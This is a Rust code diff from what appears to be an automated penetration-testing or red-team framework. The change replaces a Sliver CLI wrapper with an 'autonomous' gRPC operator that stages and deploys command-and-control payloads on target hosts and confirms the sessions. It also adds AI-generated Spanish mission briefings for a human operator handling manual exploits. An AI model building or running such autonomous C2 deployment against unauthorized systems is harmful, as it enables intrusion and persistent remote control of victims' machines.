@@ -1,3 +1,4 @@
+use crate::core::validation::PocValidator;
 use anyhow::Result;
 use tracing::{info, warn};
 use std::time::Duration;
@@ -9,29 +10,58 @@ use crate::utils::executor::ExecutorMode;
 
 impl<M: ExecutorMode> PocValidator<M> {
     pub(crate) async fn deploy_c2(&self, target: &TargetHost) -> Result<()> {
-        let sliver = crate::plugins::lateral_movement::sliver::SliverScanner::<M>::new(self.executor.clone());
+        // V14.1 SOVEREIGN: Use autonomous gRPC operator instead of CLI wrapper
+        let sovereign_operator = crate::plugins::lateral_movement::sliver_sovereign::SovereignSliverOperator::<M>::new(self.executor.clone()).await?;
         
-        match sliver.prepare_payload(target).await {
+        match sovereign_operator.prepare_payload(target).await {
             Ok(payload_path) => {
-                info!("🔱 V14.1 SOVEREIGN: C2 payload staged at {}. Deploying...", payload_path);
-                tokio::time::sleep(Duration::from_secs(5)).await;
+                info!("🔱 V14.1 SOVEREIGN: Autonomous C2 payload staged at {}. Deploying...", payload_path);
                 
                 use crate::core::c2::SessionState;
-                if sliver.verify_session(target).await? == SessionState::Sovereign {
-                    info!("🎯 V14.1 SOVEREIGN: C2 SESSION ESTABLISHED for {}", target.host);
-                } else {
-                    let _ = sliver.deploy_payload(target, &payload_path).await;
+                match sovereign_operator.verify_session(target).await? {
+                    SessionState::Sovereign => {
+                        info!("🎯 V14.1 SOVEREIGN: C2 SESSION ALREADY ESTABLISHED for {}", target.host);
+                    }
+                    _ => {
+                        sovereign_operator.deploy_payload(target, &payload_path).await?;
+                        tokio::time::sleep(Duration::from_secs(10)).await;
+                        
+                        if sovereign_operator.verify_session(target).await? == SessionState::Sovereign {
+                            info!("🎯 V14.1 SOVEREIGN: AUTONOMOUS C2 SESSION ESTABLISHED for {}", target.host);
+                        }
+                    }
                 }
             }
-            Err(e) => warn!("⚠️ V14.1 SOVEREIGN: C2 deployment failed: {}", e),
+            Err(e) => warn!("⚠️ V14.1 SOVEREIGN: Autonomous C2 deployment failed: {}", e),
         }
         Ok(())
     }
 
     pub(crate) async fn sovereign_handover(&self, finding: &mut Finding, target: &TargetHost, poc: &PocDefinition) -> Result<bool> {
-        info!("🏛️ SOVEREIGN MODE: High complexity exploit detected. Initiating HALT.");
+        info!("🏛️ SOVEREIGN MODE: High complexity exploit detected. Initiating HALT for mission briefing.");
         
-        let context = format!("### SOVEREIGN HANDOVER ###\nTarget: {}\nFinding: {}\nComplexity: {}", target.host, finding.title, poc.complexity_score);
+        // V14.1 Language Pivot: Generate a professional briefing in Spanish for the human operator
+        // We use CavemanLevel::Lite (English/Normal) and then manually wrap it, 
+        // OR better, we use analyze_with_level and force the human pivot.
+        
+        let raw_instruction = format!("Generate a professional mission briefing for a human operator to manually validate this: {}. Target: {}. Strategy: {:?}", finding.title, target.host, poc.strategy);
+        let human_instruction = crate::core::ai::caveman::CavemanOptimizer::pivot_to_human_readable(&raw_instruction, true); // true = Spanish
+        
+        // We use RouteLevel::Premium for the best possible explanation
+        let analysis = self.router.analyze_with_level(finding, target, Some(&human_instruction), crate::core::ai::RouteLevel::Premium, crate::core::ai::CavemanLevel::Off).await?;
+        
+        let context = format!(
+            "### 🏛️ SOVEREIGN MISSION BRIEFING (MANUAL EXPLOIT) ###\n\n\
+            Target: {}\n\
+            Finding: {}\n\
+            Complexity: {}\n\n\
+            --- MISSION CONTEXT ---\n\
+            {}\n\n\
+            --- REMEDIATION ---\n\
+            {}", 
+            target.host, finding.title, poc.complexity_score, analysis.summary, analysis.remediation
+        );
+
         let req_id = self.approval_gate.request_approval(&format!("HANDOVER: {}", finding.title), 100, &self.operator, &context).await?;
 
         if let Some(id) = req_id {
